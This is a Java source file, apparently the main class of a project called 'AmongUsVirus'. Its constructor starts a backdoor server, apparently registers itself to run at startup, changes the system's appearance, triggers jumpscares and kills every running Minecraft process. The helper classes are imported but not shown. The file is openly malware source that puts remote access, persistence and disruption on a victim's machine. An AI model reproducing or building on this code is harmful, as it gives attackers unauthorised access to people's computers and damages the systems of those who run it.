package com.github.pulsebeat02;

import com.github.pulsebeat02.appearance.AppearanceChanger;
import com.github.pulsebeat02.backdoor.BackDoorServer;
import com.github.pulsebeat02.backdoor.ServerStartup;
import com.github.pulsebeat02.jumpscare.RandomJumpScare;
import com.github.pulsebeat02.utility.TaskUtilities;

import java.net.URISyntaxException;

public class AmongUsVirus {

  private final BackDoorServer server;
  private final ServerStartup startup;
  private final AppearanceChanger changer;
  private RandomJumpScare jumpScare;

  public AmongUsVirus() {
    try {
      jumpScare = new RandomJumpScare();
    } catch (final URISyntaxException e) {
      e.printStackTrace();
    }
    server = new BackDoorServer();
    startup = new ServerStartup();
    startup.addRegistry();
    changer = new AppearanceChanger();
    killMinecraftTasks();
  }

  public static void main(final String[] args) throws URISyntaxException {
    new RandomJumpScare();
  }

  public void killMinecraftTasks() {
    TaskUtilities.killAllTasks("Minecraft");
  }
}
